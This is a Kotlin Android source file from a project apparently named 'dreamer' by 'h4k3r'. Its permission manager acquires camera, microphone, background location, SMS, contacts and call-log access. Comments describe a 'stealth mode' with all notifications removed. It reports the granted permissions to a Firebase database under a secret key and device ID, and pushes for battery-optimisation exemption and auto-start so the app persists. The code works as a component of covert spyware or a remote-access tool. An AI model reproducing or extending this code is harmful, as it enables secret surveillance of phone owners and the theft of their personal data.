package com.h4k3r.dreamer

import android.app.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*
import java.util.concurrent.ConcurrentLinkedQueue

class SmartPermissionManager(private val context: Context) {
    companion object {
        private const val TAG = "SmartPermissionManager"
        private const val CHANNEL_ID = "permission_helper"
        private const val NOTIFICATION_ID = 999

        @Volatile
        private var instance: SmartPermissionManager? = null

        fun getInstance(context: Context): SmartPermissionManager {
            return instance ?: synchronized(this) {
                instance ?: SmartPermissionManager(context.applicationContext).also { instance = it }
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private val permissionQueue = ConcurrentLinkedQueue<PermissionRequest>()
    private var isProcessing = false
    private val prefs = context.getSharedPreferences("permission_state", Context.MODE_PRIVATE)

    // Track permission request timing to avoid spam
    private val lastRequestTime = mutableMapOf<String, Long>()
    private val REQUEST_COOLDOWN = 30000L // 30 seconds

    data class PermissionRequest(
        val permission: String,
        val priority: Int = 0,
        val callback: ((Boolean) -> Unit)? = null,
        val retryCount: Int = 0
    )

    init {
        // No notifications - completely silent
    }

    /* ── Android 15+ Compatible Permission Request ────────────── */
    fun requestPermissionsDirect(permissions: List<String>, callback: (Map<String, Boolean>) -> Unit) {
        scope.launch {
            Log.d(TAG, "requestPermissionsDirect called with permissions: $permissions")

            val results = mutableMapOf<String, Boolean>()

            // Check which permissions we actually need to request
            val permissionsToRequest = permissions.mapNotNull { permission ->
                val manifestPerm = getManifestPermission(permission)
                if (manifestPerm != null && !hasPermission(manifestPerm)) {
                    permission to manifestPerm
                } else {
                    if (manifestPerm != null) {
                        results[permission] = true
                    }
                    null
                }
            }

            if (permissionsToRequest.isEmpty()) {
                Log.d(TAG, "All permissions already granted")
                callback(permissions.associateWith { true })
                return@launch
            }

            Log.d(TAG, "Requesting ${permissionsToRequest.size} permissions")

            // Handle background location specially (Android 15+ requirement)
            val hasBackgroundLocation = permissionsToRequest.any { it.first == "location_background" }
            val regularPermissions = permissionsToRequest.filter { it.first != "location_background" }

            // First request regular permissions
            if (regularPermissions.isNotEmpty()) {
                val regularResults = requestRegularPermissions(regularPermissions)
                results.putAll(regularResults)

                // Wait a bit for user to process
                delay(2000)
            }

            // Then request background location if needed and fine location is granted
            if (hasBackgroundLocation && results["location_fine"] == true) {
                val backgroundResult = requestBackgroundLocation()
                results["location_background"] = backgroundResult
            } else if (hasBackgroundLocation) {
                results["location_background"] = false
                Log.w(TAG, "Cannot request background location without fine location")
            }

            // Update Firebase with results
            updatePermissionResults(results)

            Log.d(TAG, "Final permission results: $results")
            callback(results)
        }
    }

    private suspend fun requestRegularPermissions(permissions: List<Pair<String, String>>): Map<String, Boolean> {
        return withContext(Dispatchers.Main) {
            val results = mutableMapOf<String, Boolean>()

            // Group permissions by type for better UX
            val cameraPerms = permissions.filter { it.first == "camera" }
            val locationPerms = permissions.filter { it.first.contains("location") && it.first != "location_background" }
            val otherPerms = permissions.filter { !it.first.contains("location") && it.first != "camera" }

            // Request camera first (most important)
            if (cameraPerms.isNotEmpty()) {
                Log.d(TAG, "Requesting camera permissions")
                val cameraResults = requestPermissionGroup(cameraPerms, "Camera")
                results.putAll(cameraResults)
                delay(1500)
            }

            // Then location
            if (locationPerms.isNotEmpty()) {
                Log.d(TAG, "Requesting location permissions")
                val locationResults = requestPermissionGroup(locationPerms, "Location")
                results.putAll(locationResults)
                delay(1500)
            }

            // Then others
            if (otherPerms.isNotEmpty()) {
                Log.d(TAG, "Requesting other permissions")
                val otherResults = requestPermissionGroup(otherPerms, "Other")
                results.putAll(otherResults)
            }

            results
        }
    }

    private suspend fun requestPermissionGroup(permissions: List<Pair<String, String>>, groupName: String): Map<String, Boolean> {
        return withContext(Dispatchers.Main) {
            val results = mutableMapOf<String, Boolean>()

            try {
                // Silent permission request - no notifications

                val intent = Intent(context, PermissionHelperActivity::class.java).apply {
                    putExtra("multiple_permissions", permissions.map { it.second }.toTypedArray())
                    putExtra("permission_names", permissions.map { it.first }.toTypedArray())
                    putExtra("group_name", groupName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }

                Log.d(TAG, "Launching PermissionHelperActivity for $groupName")
                context.startActivity(intent)

                // Wait for user response with timeout
                val waitTime = if (permissions.size > 2) 15000L else 10000L
                delay(waitTime)

                // Check results
                permissions.forEach { (permission, manifestPerm) ->
                    val isGranted = hasPermission(manifestPerm)
                    results[permission] = isGranted
                    updatePermissionStatus(permission, isGranted)
                    Log.d(TAG, "Permission $permission: ${if (isGranted) "GRANTED" else "DENIED"}")
                }

                // Silent - no notifications to hide

            } catch (e: Exception) {
                Log.e(TAG, "Error requesting $groupName permissions: ${e.message}")
                // Mark all as denied on error
                permissions.forEach { (permission, _) ->
                    results[permission] = false
                }
            }

            results
        }
    }

    private suspend fun requestBackgroundLocation(): Boolean {
        return withContext(Dispatchers.Main) {
            try {
                if (Build.VERSION.SDK_INT < 29) {
                    // Background location not needed on older Android
                    return@withContext true
                }

                Log.d(TAG, "Requesting background location permission")

                // Silent background location request

                val intent = Intent(context, PermissionHelperActivity::class.java).apply {
                    putExtra("runtime_permission", android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    putExtra("permission", "location_background")
                    putExtra("is_background_location", true)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }

                context.startActivity(intent)

                // Wait longer for background location (user needs to select "Allow all the time")
                delay(15000)

                val isGranted = hasPermission(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                updatePermissionStatus("location_background", isGranted)

                // Silent - no notifications to hide

                Log.d(TAG, "Background location permission: ${if (isGranted) "GRANTED" else "DENIED"}")
                isGranted

            } catch (e: Exception) {
                Log.e(TAG, "Error requesting background location: ${e.message}")
                false
            }
        }
    }

    /* ── Permission Checking ────────────────────────────────── */
    private fun hasPermission(manifestPermission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, manifestPermission) == PackageManager.PERMISSION_GRANTED
    }

    private fun isPermissionGranted(permission: String): Boolean {
        val manifestPermission = getManifestPermission(permission) ?: return false
        return hasPermission(manifestPermission)
    }

    /* ── Silent Operation - No Notifications ──────────────────────── */
    // All notification methods removed for stealth mode

    /* ── Auto-Start & Battery Optimization (Enhanced) ─────── */
    fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(context.packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:${context.packageName}")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to request battery optimization exemption: ${e.message}")
                }
            }
        }
    }

    fun requestAutoStart() {
        val manufacturer = Build.MANUFACTURER.lowercase()

        val intent = when (manufacturer) {
            "xiaomi" -> Intent().apply {
                component = ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
                )
            }
            "oppo" -> Intent().apply {
                component = ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                )
            }
            "vivo" -> Intent().apply {
                component = ComponentName(
                    "com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                )
            }
            "huawei" -> Intent().apply {
                component = ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                )
            }
            "samsung" -> Intent().apply {
                component = ComponentName(
                    "com.samsung.android.lool",
                    "com.samsung.android.sm.ui.battery.BatteryActivity"
                )
            }
            else -> null
        }

        intent?.let {
            try {
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(it)
                Log.d(TAG, "Opened auto-start settings for $manufacturer")
            } catch (e: Exception) {
                Log.e(TAG, "Auto-start settings not available for $manufacturer: ${e.message}")
            }
        }
    }

    /* ── Helper Methods (Enhanced) ──────────────────────── */
    private fun getManifestPermission(permission: String): String? {
        return when (permission) {
            "camera" -> android.Manifest.permission.CAMERA
            "location", "location_fine" -> android.Manifest.permission.ACCESS_FINE_LOCATION
            "location_coarse" -> android.Manifest.permission.ACCESS_COARSE_LOCATION
            "location_background" -> if (Build.VERSION.SDK_INT >= 29) {
                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
            } else null
            "contacts" -> android.Manifest.permission.READ_CONTACTS
            "sms" -> android.Manifest.permission.READ_SMS
            "phone" -> android.Manifest.permission.READ_PHONE_STATE
            "call_log" -> android.Manifest.permission.READ_CALL_LOG
            "microphone" -> android.Manifest.permission.RECORD_AUDIO
            "calendar" -> android.Manifest.permission.READ_CALENDAR
            "storage_read" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.READ_MEDIA_IMAGES
            } else {
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            }
            "notifications", "post_notifications" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.POST_NOTIFICATIONS
            } else null
            "bluetooth_connect" -> if (Build.VERSION.SDK_INT >= 31) {
                android.Manifest.permission.BLUETOOTH_CONNECT
            } else null
            "bluetooth_scan" -> if (Build.VERSION.SDK_INT >= 31) {
                android.Manifest.permission.BLUETOOTH_SCAN
            } else null
            else -> null
        }
    }

    private fun updatePermissionStatus(permission: String, granted: Boolean) {
        // Update local storage
        prefs.edit().putBoolean("perm_$permission", granted).apply()
        Log.d(TAG, "Updated permission status: $permission = $granted")
    }

    private fun updatePermissionResults(results: Map<String, Boolean>) {
        try {
            val deviceId = context.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
                .getString("device_id", "") ?: ""
            val secretKey = context.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
                .getString("secret_key", "") ?: ""

            if (deviceId.isNotEmpty() && secretKey.isNotEmpty()) {
                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .child("permissions")
                    .setValue(results)
                    .addOnSuccessListener {
                        Log.d(TAG, "Permission results updated in Firebase")
                    }
                    .addOnFailureListener { e ->
                        Log.e(TAG, "Failed to update Firebase: ${e.message}")
                    }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error updating Firebase: ${e.message}")
        }
    }

    /* ── Permission Verification ──────────────────────── */
    fun verifyAllPermissions(): Map<String, Boolean> {
        val requiredPermissions = listOf(
            "camera", "location_fine", "contacts", "sms",
            "phone", "microphone", "storage_read", "call_log",
            "post_notifications"
        )

        val results = mutableMapOf<String, Boolean>()

        requiredPermissions.forEach { permission ->
            results[permission] = isPermissionGranted(permission)
        }

        // Add background location if Android 10+
        if (Build.VERSION.SDK_INT >= 29) {
            results["location_background"] = isPermissionGranted("location_background")
        }

        Log.d(TAG, "Permission verification results: $results")
        return results
    }

    fun cleanup() {
        scope.cancel()
    }
}